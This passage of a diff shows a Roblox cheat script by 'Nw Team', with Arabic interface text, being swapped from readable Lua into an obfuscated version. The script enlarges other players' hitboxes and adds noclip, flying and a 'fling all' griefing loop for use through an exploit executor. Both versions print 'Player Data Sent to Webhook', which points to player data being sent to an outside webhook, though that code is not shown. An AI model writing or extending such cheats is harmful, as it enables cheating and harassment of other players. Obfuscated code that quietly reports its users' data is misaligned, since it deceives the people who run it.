-    local RootPart = Char and Char:FindFirstChild("HumanoidRootPart")
-    if RootPart and _G.FlyEnabled then
-        if isGoingUpConnection then isGoingUpConnection:Disconnect() end
-        isGoingUpConnection = RunService.Heartbeat:Connect(function()
-            RootPart.CFrame = RootPart.CFrame * CFrame.new(0, 2 * speeds, 0)
-        end)
-    end
-end)
-
-UpButton.MouseButton1Up:Connect(function()
-    if isGoingUpConnection then 
-        isGoingUpConnection:Disconnect() 
-        isGoingUpConnection = nil 
-    end
-end)
-
-DownButton.MouseButton1Down:Connect(function()
-    local Char = LocalPlayer.Character
-    local RootPart = Char and Char:FindFirstChild("HumanoidRootPart")
-    if RootPart and _G.FlyEnabled then
-        if isGoingDownConnection then isGoingDownConnection:Disconnect() end
-        isGoingDownConnection = RunService.Heartbeat:Connect(function()
-            RootPart.CFrame = RootPart.CFrame * CFrame.new(0, -2 * speeds, 0)
-        end)
-    end
-end)
-
-DownButton.MouseButton1Up:Connect(function()
-    if isGoingDownConnection then 
-        isGoingDownConnection:Disconnect() 
-        isGoingDownConnection = nil 
-    end
-end)
-
--- ===============================================
--- ⌨️ إدخال لوحة المفاتيح للطيران
--- ===============================================
-
-game:GetService("UserInputService").InputBegan:Connect(function(input)
-    if not _G.FlyEnabled then return end
-    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 1 end
-    if input.KeyCode == Enum.KeyCode.S then ctrl.b = -1 end
-    if input.KeyCode == Enum.KeyCode.A then ctrl.l = -1 end
-    if input.KeyCode == Enum.KeyCode.D then ctrl.r = 1 end
-end)
-
-game:GetService("UserInputService").InputEnded:Connect(function(input)
-    if not _G.FlyEnabled then return end
-    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 0 end
-    if input.KeyCode == Enum.KeyCode.S then ctrl.b = 0 end
-    if input.KeyCode == Enum.KeyCode.A then ctrl.l = 0 end
-    if input.KeyCode == Enum.KeyCode.D then ctrl.r = 0 end
-end)
-
--- ===============================================
--- 🔄 حلقة التشغيل
--- ===============================================
-
-RunService.RenderStepped:Connect(function()
-    if _G.Disabled then
-        for _, v in next, Players:GetPlayers() do
-            local hrp = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
-            if v.Name ~= LocalPlayer.Name and hrp then
-                pcall(function()
-                    hrp.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
-                    hrp.Transparency = 0.7
-                    hrp.BrickColor = BrickColor.new("Really black")
-                    hrp.Material = "Neon"
-                    hrp.CanCollide = false
-                end)
-            end
-        end
-    end
-end)
-
--- ===============================================
--- 🚀 إشعار النهاية
--- ===============================================
-
-Message("Nw Team", "تم تحميل السكربت بنجاح! ✅", 3)
-Message("Nw Team", "By Rew", 3)
-print("=========================================")
-print("✅ Nw Team Script Loaded Successfully!")
-print("📊 Player Data Sent to Webhook")
-print("🎮 GUI Created Successfully")
-print("=========================================")
+	while task.wait(2 - 1) do
+		if v54.Visible then
+			local v364 = tick() - v36;
+			v84[6].Text = "السكربت شغال له: " .. v83(v364);
+		end
+	end
+end)();
+local v86 = Instance.new("TextButton");
+v86.Name = "CloseButton";
+v86.Parent = v54;
+v86.BackgroundColor3 = Color3.fromRGB(255, 580 - (361 + 219), 320 - (53 + 267));
+v86.Position = UDim2.new(1 + 0, -25, 413 - (15 + 398), 982 - (18 + 964));
+v86.Size = UDim2.new(0, 94 - 69, 0 + 0, 16 + 9);
+v86.Text = "X";
+v86.TextColor3 = Color3.fromRGB(1105 - (20 + 830), 255, 200 + 55);
+v86.Font = Enum.Font.SourceSansBold;
+v86.TextSize = 140 - (116 + 10);
+v86.ZIndex = 12;
+local v97 = Instance.new("TextButton");
+v97.Name = "OpenButton";
+v97.Parent = v48;
+v97.Size = UDim2.new(0 + 0, 60, 738 - (542 + 196), 60);
+v97.Position = UDim2.new(0.8 - 0, 0 + 0, 0.05 + 0, 0 + 0);
+v97.BackgroundColor3 = Color3.fromRGB(0 - 0, 0 - 0, 0);
+v97.TextColor3 = Color3.fromRGB(1806 - (1126 + 425), 660 - (118 + 287), 0 - 0);
+v97.Text = "افتح\nالسكربت";
+v97.Font = Enum.Font.SourceSansBold;
+v97.TextSize = 1135 - (118 + 1003);
+v97.TextWrapped = true;
+v97.Visible = false;
+v86.MouseButton1Down:Connect(function()
+	v54.Visible = false;
+	v97.Visible = true;
+end);
+v97.MouseButton1Down:Connect(function()
+	v54.Visible = true;
+	v97.Visible = false;
+end);
+local v109 = 409 - 269;
+local v110 = 407 - (142 + 235);
+local v111 = 0.45 - 0;
+local v112 = 0.1;
+local v113 = Instance.new("TextButton");
+v113.Name = "HitboxEnable";
+v113.Parent = v54;
+v113.BackgroundColor3 = Color3.fromRGB(0 + 0, 1232 - (553 + 424), 0);
+v113.Position = UDim2.new(0.03, 0 - 0, v111, 0);
+v113.Size = UDim2.new(0 + 0, v109, 0, v110);
+v113.Text = "تفعيل Hitbox";
+v113.TextColor3 = Color3.fromRGB(0 + 0, 0 + 0, 0 + 0);
+v113.TextSize = 8 + 6;
+v113.Font = Enum.Font.SourceSansBold;
+local v123 = Instance.new("TextButton");
+v123.Name = "NoclipToggle";
+v123.Parent = v54;
+v123.BackgroundColor3 = Color3.fromRGB(50, 108 - 58, 139 - 89);
+v123.Position = UDim2.new(0.53 - 0, 0 + 0, v111, 0 - 0);
+v123.Size = UDim2.new(753 - (239 + 514), v109, 0 + 0, v110);
+v123.Text = "اختراق الجدران (Off)";
+v123.TextColor3 = Color3.fromRGB(255, 1584 - (797 + 532), 186 + 69);
+v123.TextSize = 5 + 9;
+v123.Font = Enum.Font.SourceSansBold;
+local v133 = Instance.new("TextButton");
+v133.Name = "HitboxDisable";
+v133.Parent = v54;
+v133.BackgroundColor3 = Color3.fromRGB(255, 0 - 0, 1202 - (373 + 829));
+v133.Position = UDim2.new(731.03 - (476 + 255), 1130 - (369 + 761), v111 + v112, 0 + 0);
+v133.Size = UDim2.new(0 - 0, v109, 0 - 0, v110);
+v133.Text = "تعطيل Hitbox";
+v133.TextColor3 = Color3.fromRGB(255, 255, 255);
+v133.TextSize = 252 - (64 + 174);
+v133.Font = Enum.Font.SourceSansBold;
+local v143 = Instance.new("TextButton");
+v143.Name = "FlingToggle";
+v143.Parent = v54;
+v143.BackgroundColor3 = Color3.fromRGB(8 + 42, 74 - 24, 386 - (144 + 192));
+v143.Position = UDim2.new(216.53 - (42 + 174), 0 + 0, v111 + v112, 0);
+v143.Size = UDim2.new(0 + 0, v109, 0 + 0, v110);
+v143.Text = "فلنق الكل (Off)";
+v143.TextColor3 = Color3.fromRGB(1759 - (363 + 1141), 1835 - (1183 + 397), 776 - 521);
+v143.TextSize = 14;
+v143.Font = Enum.Font.SourceSansBold;
+local v153 = Instance.new("TextButton");
+v153.Name = "DiscordButton";
+v153.Parent = v54;
+v153.BackgroundColor3 = Color3.fromRGB(84 + 30, 103 + 34, 2193 - (1913 + 62));
+v153.Position = UDim2.new(0.03 + 0, 0, v111 + (v112 * 2), 0 - 0);
+v153.Size = UDim2.new(0, v109, 0, v110);
+v153.Text = "📋 نسخ رابط الديسكورد";
+v153.TextColor3 = Color3.fromRGB(2188 - (565 + 1368), 958 - 703, 1916 - (1477 + 184));
+v153.TextSize = 18 - 4;
+v153.Font = Enum.Font.SourceSansBold;
+local v163 = Instance.new("TextButton");
+v163.Name = "RejoinButton";
+v163.Parent = v54;
+v163.BackgroundColor3 = Color3.fromRGB(50, 47 + 3, 906 - (564 + 292));
+v163.Position = UDim2.new(0.53 - 0, 0 - 0, v111 + (v112 * 2), 304 - (244 + 60));
+v163.Size = UDim2.new(0 + 0, v109, 0, v110);
+v163.Text = "Rejoin السيرفر";
+v163.TextColor3 = Color3.fromRGB(731 - (41 + 435), 1256 - (938 + 63), 255);
+v163.TextSize = 11 + 3;
+v163.Font = Enum.Font.SourceSansBold;
+local v173 = Instance.new("Frame");
+v173.Name = "FlyControl";
+v173.Parent = v54;
+v173.BackgroundColor3 = Color3.fromRGB(1155 - (936 + 189), 10 + 20, 1643 - (1565 + 48));
+v173.Position = UDim2.new(0.03 + 0, 1138 - (782 + 356), v111 + (v112 * (270 - (176 + 91))), 0 - 0);
+v173.Size = UDim2.new(0.94 - 0, 1092 - (975 + 117), 1875 - (157 + 1718), 90);
+local v179 = Instance.new("TextLabel");
+v179.Parent = v173;
+v179.BackgroundColor3 = Color3.fromRGB(0 + 0, 0 - 0, 0);
+v179.Size = UDim2.new(3 - 2, 1018 - (697 + 321), 0 - 0, 20);
+v179.Text = "✈️ Fly Control";
+v179.TextColor3 = Color3.fromRGB(255, 539 - 284, 0);
+v179.TextSize = 31 - 17;
+v179.Font = Enum.Font.SourceSansBold;
+local v187 = Instance.new("TextButton");
+v187.Name = "FlyToggleBtn";
+v187.Parent = v173;
+v187.BackgroundColor3 = Color3.fromRGB(20 + 30, 93 - 43, 134 - 84);
+v187.Position = UDim2.new(1227.02 - (322 + 905), 0, 611.25 - (602 + 9), 1189 - (449 + 740));
+v187.Size = UDim2.new(872.48 - (826 + 46), 947 - (245 + 702), 0, 78 - 53);
+v187.Text = "تفعيل الطيران (Off)";
+v187.TextColor3 = Color3.fromRGB(82 + 173, 2153 - (260 + 1638), 255);
+v187.TextSize = 452 - (382 + 58);
+local v196 = Instance.new("TextLabel");
+v196.Name = "FlySpeed";
+v196.Parent = v173;
+v196.BackgroundColor3 = Color3.fromRGB(0, 320 - 220, 125 + 25);
+v196.Position = UDim2.new(0.52 - 0, 0, 0.25 - 0, 1205 - (902 + 303));
+v196.Size = UDim2.new(0.46, 0 - 0, 0 - 0, 3 + 22);
+v196.Text = "السرعة: x" .. v23;
+v196.TextColor3 = Color3.fromRGB(1945 - (1121 + 569), 255, 469 - (22 + 192));
+v196.TextSize = 12;
+local v205 = Instance.new("Frame");
+v205.Parent = v173;
+v205.BackgroundTransparency = 1;
+v205.Position = UDim2.new(0, 0, 683.55 - (483 + 200), 0);
+v205.Size = UDim2.new(1464 - (1404 + 59), 0 - 0, 0 - 0, 800 - (468 + 297));
+local v210 = Instance.new("TextButton");
+v210.Name = "UpBtn";
+v210.Parent = v205;
+v210.BackgroundColor3 = Color3.fromRGB(612 - (334 + 228), 50, 50);
+v210.Position = UDim2.new(0.02 - 0, 0, 0 - 0, 0 - 0);
+v210.Size = UDim2.new(0.23 + 0, 236 - (141 + 95), 1, 0 + 0);
+v210.Text = "⬆️";
+v210.TextColor3 = Color3.fromRGB(656 - 401, 612 - 357, 255);
+v210.TextSize = 16;
+local v219 = Instance.new("TextButton");
+v219.Name = "DownBtn";
+v219.Parent = v205;
+v219.BackgroundColor3 = Color3.fromRGB(12 + 38, 50, 136 - 86);
+v219.Position = UDim2.new(0.27 + 0, 0 + 0, 0 - 0, 0 + 0);
+v219.Size = UDim2.new(0.23, 0, 164 - (92 + 71), 0);
+v219.Text = "⬇️";
+v219.TextColor3 = Color3.fromRGB(255, 126 + 129, 255);
+v219.TextSize = 26 - 10;
+local v228 = Instance.new("TextButton");
+v228.Name = "PlusBtn";
+v228.Parent = v205;
+v228.BackgroundColor3 = Color3.fromRGB(765 - (574 + 191), 124 + 26, 0 - 0);
+v228.Position = UDim2.new(0.52 + 0, 849 - (254 + 595), 126 - (55 + 71), 0);
+v228.Size = UDim2.new(0.23 - 0, 1790 - (573 + 1217), 2 - 1, 0 + 0);
+v228.Text = "+ السرعة";
+v228.TextColor3 = Color3.fromRGB(255, 255, 410 - 155);
+v228.TextSize = 12;
+local v237 = Instance.new("TextButton");
+v237.Name = "MinusBtn";
+v237.Parent = v205;
+v237.BackgroundColor3 = Color3.fromRGB(1089 - (714 + 225), 0 - 0, 0 - 0);
+v237.Position = UDim2.new(0.77 + 0, 0, 0 - 0, 806 - (118 + 688));
+v237.Size = UDim2.new(48.21 - (25 + 23), 0, 1 + 0, 0);
+v237.Text = "- السرعة";
+v237.TextColor3 = Color3.fromRGB(255, 2141 - (927 + 959), 859 - 604);
+v237.TextSize = 744 - (16 + 716);
+v113.MouseButton1Down:Connect(function()
+	_G.Disabled = true;
+	v113.BackgroundColor3 = Color3.fromRGB(0 - 0, 297 - (11 + 86), 0 - 0);
+	v133.BackgroundColor3 = Color3.fromRGB(485 - (175 + 110), 0 - 0, 0);
+	v44("Nw Team", "تم تفعيل Hitbox", 2);
+end);
+v133.MouseButton1Down:Connect(function()
+	local v291 = 0 - 0;
+	while true do
+		if (v291 == (1797 - (503 + 1293))) then
+			v133.BackgroundColor3 = Color3.fromRGB(255, 139 - 89, 37 + 13);
+			v113.BackgroundColor3 = Color3.fromRGB(1061 - (810 + 251), 105 + 45, 0 + 0);
+			v291 = 2 + 0;
+		end
+		if (v291 == (535 - (43 + 490))) then
+			v44("Nw Team", "تم تعطيل Hitbox", 2);
+			break;
+		end
+		if (v291 == (733 - (711 + 22))) then
+			_G.Disabled = false;
+			for v392, v393 in next, v6:GetPlayers() do
+				if ((v393.Name ~= v18.Name) and v393.Character) then
+					local v432 = v393.Character:FindFirstChild("HumanoidRootPart");
+					if v432 then
+						pcall(function()
+							v432.Size = v33;
+							v432.Transparency = 0;
+							v432.BrickColor = v34;
+							v432.Material = v35;
+							v432.CanCollide = true;
+						end);
+					end
+				end
+			end
+			v291 = 3 - 2;
+		end
+	end
+end);
+v123.MouseButton1Down:Connect(function()
+	local v292 = 859 - (240 + 619);
+	while true do
+		if (1 == v292) then
+			if v21 then
+				v123.Text = "اختراق الجدران (On)";
+				v123.BackgroundColor3 = Color3.fromRGB(0 + 0, 270 - 100, 17 + 238);
+				v44("Nw Team", "تم تفعيل Noclip", 1746 - (1344 + 400));
+			else
+				v123.Text = "اختراق الجدران (Off)";
+				v123.BackgroundColor3 = Color3.fromRGB(455 - (255 + 150), 50, 40 + 10);
+				v44("Nw Team", "تم تعطيل Noclip", 2);
+			end
+			break;
+		end
+		if (v292 == 0) then
+			v21 = not v21;
+			v40(v21);
+			v292 = 1 + 0;
+		end
+	end
+end);
+v143.MouseButton1Down:Connect(function()
+	local v293 = 0 - 0;
+	while true do
+		if ((0 - 0) == v293) then
+			_G.FlingEnabled = not _G.FlingEnabled;
+			if _G.FlyEnabled then
+				v43(false);
+			end
+			v293 = 1;
+		end
+		if ((1740 - (404 + 1335)) == v293) then
+			if _G.FlingEnabled then
+				v143.Text = "فلنق الكل (On)";
+				v143.BackgroundColor3 = Color3.fromRGB(406 - (183 + 223), 206 - 36, 169 + 86);
+				v44("Nw Team", "تم تفعيل الفلنج", 2);
+				coroutine.wrap(function()
+					while _G.FlingEnabled do
+						v47();
+						if not _G.FlingEnabled then
+							break;
+						end
+						task.wait(0.1 + 0);
+					end
+				end)();
+			else
+				local v405 = 337 - (10 + 327);
+				while true do
+					if (1 == v405) then
+						v44("Nw Team", "تم تعطيل الفلنج", 2 + 0);
+						break;
+					end
+					if (v405 == (338 - (118 + 220))) then
+						v143.Text = "فلنق الكل (Off)";
+						v143.BackgroundColor3 = Color3.fromRGB(50, 50, 50);
+						v405 = 1 + 0;
+					end
+				end
+			end
+			break;
+		end
+	end
+end);
+v153.MouseButton1Down:Connect(function()
+	if setclipboard then
+		local v327 = 449 - (108 + 341);
+		while true do
+			if (v327 == (1 + 0)) then
+				v153.Text = "تم النسخ!";
+				v153.BackgroundColor3 = Color3.fromRGB(0 - 0, 1693 - (711 + 782), 0 - 0);
+				v44("Nw Team", "تم نسخ رابط الديسكورد", 472 - (270 + 199));
+				v327 = 1 + 1;
+			end
+			if (v327 == 2) then
+				task.wait(1821 - (580 + 1239));
+				v65.Text = "Nw Team - Made by Rew";
+				v65.TextColor3 = Color3.fromRGB(758 - 503, 0 + 0, 0 + 0);
+				v327 = 3;
+			end
+			if (v327 == (2 + 1)) then
+				v153.Text = "📋 نسخ رابط الديسكورد";
+				v153.BackgroundColor3 = Color3.fromRGB(297 - 183, 86 + 51, 218);
+				break;
+			end
+			if (v327 == (1167 - (645 + 522))) then
+				setclipboard(v38);
+				v65.Text = "تم نسخ رابط الديسكورد!";
+				v65.TextColor3 = Color3.fromRGB(0, 2045 - (1010 + 780), 0 + 0);
+				v327 = 4 - 3;
+			end
+		end
+	else
+		v44("Nw Team", "الإكسبلويت لا يدعم setclipboard", 8 - 5);
+	end
+end);
+v163.MouseButton1Down:Connect(function()
+	v44("Nw Team", "جاري إعادة الدخول...", 1838 - (1045 + 791));
+	task.wait(2.5 - 1);
+	local v294 = game:GetService("TeleportService");
+	local v295, v296 = pcall(function()
+		v294:Teleport(game.PlaceId, v18);
+	end);
+	if not v295 then
+		v44("Nw Team", "فشل إعادة الدخول: " .. v296, 3);
+	end
+end);
+v187.MouseButton1Down:Connect(function()
+	local v297 = not _G.FlyEnabled;
+	v43(v297);
+	if v297 then
+		v187.Text = "تفعيل الطيران (On)";
+		v187.BackgroundColor3 = Color3.fromRGB(0 - 0, 170, 760 - (351 + 154));
+		v44("Nw Team", "تم تفعيل الطيران", 1576 - (1281 + 293));
+	else
+		v187.Text = "تفعيل الطيران (Off)";
+		v187.BackgroundColor3 = Color3.fromRGB(316 - (28 + 238), 111 - 61, 1609 - (1381 + 178));
+		v44("Nw Team", "تم تعطيل الطيران", 2 + 0);
+	end
+end);
+v228.MouseButton1Down:Connect(function()
+	local v298 = 0;
+	while true do
+		if (v298 == 0) then
+			v23 = v23 + 1 + 0;
+			v196.Text = "السرعة: x" .. v23;
+			break;
+		end
+	end
+end);
+v237.MouseButton1Down:Connect(function()
+	if (v23 > 1) then
+		v23 = v23 - (1 + 0);
+		v196.Text = "السرعة: x" .. v23;
+	else
+		local v333 = 0 - 0;
+		while true do
+			if (v333 == (1 + 0)) then
+				v196.Text = "السرعة: x" .. v23;
+				break;
+			end
+			if (v333 == 0) then
+				v196.Text = "الحد الأدنى x1";
+				task.wait(471 - (381 + 89));
+				v333 = 1;
+			end
+		end
+	end
+end);
+v210.MouseButton1Down:Connect(function()
+	local v299 = 0;
+	local v300;
+	local v301;
+	while true do
+		if ((0 + 0) == v299) then
+			v300 = v18.Character;
+			v301 = v300 and v300:FindFirstChild("HumanoidRootPart");
+			v299 = 1;
+		end
+		if (v299 == (1 + 0)) then
+			if (v301 and _G.FlyEnabled) then
+				local v416 = 0 - 0;
+				while true do
+					if (v416 == (1156 - (1074 + 82))) then
+						if v41 then
+							v41:Disconnect();
+						end
+						v41 = v17.Heartbeat:Connect(function()
+							v301.CFrame = v301.CFrame * CFrame.new(0 - 0, 2 * v23, 1784 - (214 + 1570));
+						end);
+						break;
+					end
+				end
+			end
+			break;
+		end
+	end
+end);
+v210.MouseButton1Up:Connect(function()
+	if v41 then
+		local v334 = 1455 - (990 + 465);
+		while true do
+			if (v334 == 0) then
+				v41:Disconnect();
+				v41 = nil;
+				break;
+			end
+		end
+	end
+end);
+v219.MouseButton1Down:Connect(function()
+	local v302 = v18.Character;
+	local v303 = v302 and v302:FindFirstChild("HumanoidRootPart");
+	if (v303 and _G.FlyEnabled) then
+		if v42 then
+			v42:Disconnect();
+		end
+		v42 = v17.Heartbeat:Connect(function()
+			v303.CFrame = v303.CFrame * CFrame.new(0 + 0, -(1 + 1) * v23, 0 + 0);
+		end);
+	end
+end);
+v219.MouseButton1Up:Connect(function()
+	if v42 then
+		local v335 = 0 - 0;
+		while true do
+			if (v335 == (1726 - (1668 + 58))) then
+				v42:Disconnect();
+				v42 = nil;
+				break;
+			end
+		end
+	end
+end);
+game:GetService("UserInputService").InputBegan:Connect(function(v304)
+	local v305 = 626 - (512 + 114);
+	while true do
+		if (v305 == 1) then
+			if (v304.KeyCode == Enum.KeyCode.S) then
+				v27.b = -(2 - 1);
+			end
+			if (v304.KeyCode == Enum.KeyCode.A) then
+				v27.l = -(1 - 0);
+			end
+			v305 = 6 - 4;
+		end
+		if (v305 == (1 + 1)) then
+			if (v304.KeyCode == Enum.KeyCode.D) then
+				v27.r = 1;
+			end
+			break;
+		end
+		if (v305 == 0) then
+			if not _G.FlyEnabled then
+				return;
+			end
+			if (v304.KeyCode == Enum.KeyCode.W) then
+				v27.f = 1;
+			end
+			v305 = 1 + 0;
+		end
+	end
+end);
+game:GetService("UserInputService").InputEnded:Connect(function(v306)
+	local v307 = 0 + 0;
+	while true do
+		if (v307 == 2) then
+			if (v306.KeyCode == Enum.KeyCode.D) then
+				v27.r = 0;
+			end
+			break;
+		end
+		if (v307 == (3 - 2)) then
+			if (v306.KeyCode == Enum.KeyCode.S) then
+				v27.b = 1994 - (109 + 1885);
+			end
+			if (v306.KeyCode == Enum.KeyCode.A) then
+				v27.l = 1469 - (1269 + 200);
+			end
+			v307 = 2;
+		end
+		if (v307 == (0 - 0)) then
+			if not _G.FlyEnabled then
+				return;
+			end
+			if (v306.KeyCode == Enum.KeyCode.W) then
+				v27.f = 0;
+			end
+			v307 = 1;
+		end
+	end
+end);
+v17.RenderStepped:Connect(function()
+	if _G.Disabled then
+		for v371, v372 in next, v6:GetPlayers() do
+			local v373 = 815 - (98 + 717);
+			local v374;
+			while true do
+				if (v373 == (826 - (802 + 24))) then
+					v374 = v372.Character and v372.Character:FindFirstChild("HumanoidRootPart");
+					if ((v372.Name ~= v18.Name) and v374) then
+						pcall(function()
+							v374.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize);
+							v374.Transparency = 0.7;
+							v374.BrickColor = BrickColor.new("Really black");
+							v374.Material = "Neon";
+							v374.CanCollide = false;
+						end);
+					end
+					break;
+				end
+			end
+		end
+	end
+end);
+v44("Nw Team", "تم تحميل السكربت بنجاح! ✅", 5 - 2);
+v44("Nw Team", "By Rew", 3 - 0);
+print("=========================================");
+print("✅ Nw Team Script Loaded Successfully!");
+print("📊 Player Data Sent to Webhook");
+print("🎮 GUI Created Successfully");
+print("=========================================");
